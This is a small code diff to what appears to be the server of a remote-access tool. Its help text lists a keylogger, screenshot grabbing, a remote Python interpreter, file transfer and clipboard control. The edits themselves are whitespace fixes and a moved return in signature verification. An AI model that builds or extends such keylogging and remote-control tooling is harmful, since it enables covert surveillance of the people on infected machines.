@@ -28,7 +28,7 @@ interface_help = """--h | See this Help Message
 --i | Open Remote Python Interpreter
 --g | Grabs a screenshot
 --u | User Info
---k (start) (stop) (status)| Manage Keylogger
+--k (start) (stop) (status) | Manage Keylogger
 --l | Returns log from client (includes keylogs)
 --s | Transfers file to Client
 --r | Transfers file to Server
@@ -79,9 +79,9 @@ def verifySignature(publicKey, signature, message) -> bool:
             ),
             hashes.SHA256()
         )
-        return True
     except:
         return False
+    return True
 
 
 def sign(privateKey, data) -> bytes:
@@ -667,7 +667,7 @@ class MultiServer(object):
             return
         if '--c' in command:
             text_to_copy = input('Text to copy: ')
-            result, error= self.fill_clipboard(conn, text_to_copy)
+            result, error = self.fill_clipboard(conn, text_to_copy)
             if result:
                 print('Copied to Clipboard.')
             else:
